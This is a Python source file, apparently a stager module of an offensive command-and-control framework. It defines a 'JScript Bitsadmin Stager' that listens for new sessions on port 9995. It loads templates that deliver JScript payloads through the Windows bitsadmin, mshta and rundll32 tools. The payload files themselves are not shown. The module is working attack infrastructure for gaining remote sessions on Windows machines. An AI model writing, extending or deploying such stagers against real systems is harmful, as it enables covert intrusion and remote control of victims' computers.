import core.stager

class BitsadminStager(core.stager.Stager):

    NAME = "JScript Bitsadmin Stager"
    DESCRIPTION = "Listens for new sessions, using JScript Bitsadmin for payloads"
    AUTHORS = ['zerosum0x0']

    WORKLOAD = "js"

    def __init__(self, shell):
        super(BitsadminStager, self).__init__(shell) # stupid hack inc!
        self.options.set("ENDPOINTTYPE", ".wsf")

    def load(self):
        #self.options.set("SRVPORT", 9999)
        self.port = 9995

        self.stagetemplate = self.loader.load_script("data/stager/js/bitsadmin/template.wsf")
        self.stagecmd = self.loader.load_script("data/stager/js/bitsadmin/bitsadmin.cmd")
        self.forktemplate = self.loader.load_script("data/stager/js/mshta/template.hta")
        self.forkcmd = self.loader.load_script("data/stager/js/rundll32/rundll32.cmd")
